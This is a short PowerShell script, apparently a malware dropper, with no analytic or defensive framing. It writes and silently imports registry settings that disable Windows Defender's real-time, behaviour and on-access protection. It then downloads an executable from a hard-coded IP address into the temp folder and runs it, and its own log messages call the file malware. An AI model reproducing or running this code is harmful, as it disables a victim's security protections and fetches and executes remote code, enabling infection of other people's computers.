# Function to disable Windows Defender
$disableDefenderScript = @"
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
"DisableAntiSpyware"=dword:00000001
"DisableRealtimeMonitoring"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
"DisableBehaviorMonitoring"=dword:00000001
"DisableOnAccessProtection"=dword:00000001
"DisableScanOnRealtimeEnable"=dword:00000001
"@"

Set-Content -Path "$($env:TEMP)\disable_defender.reg" -Value $disableDefenderScript

# Import the registry settings to disable Windows Defender
try {
    regedit.exe /s "$($env:TEMP)\disable_defender.reg"
    Write-Output "Windows Defender disabled successfully."
} catch {
    Write-Output "Failed to disable Windows Defender."
}

# Function to download a file silently
$installerUrl = 'http://54.224.34.222:3004/uploads/BootyMistress.exe'
$installerPath = "$($env:TEMP)\installer.exe"
try {
    Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -UseBasicParsing
    Write-Output "Downloaded malware file to $installerPath."
} catch {
    Write-Output "Failed to download malware file."
}

# Function to run an executable silently
try {
    Start-Process -FilePath $installerPath -NoNewWindow -PassThru
    Write-Output "Executed malware successfully."
} catch {
    Write-Output "Failed to execute malware. Exit code: $($_.Exception.Message)"
}
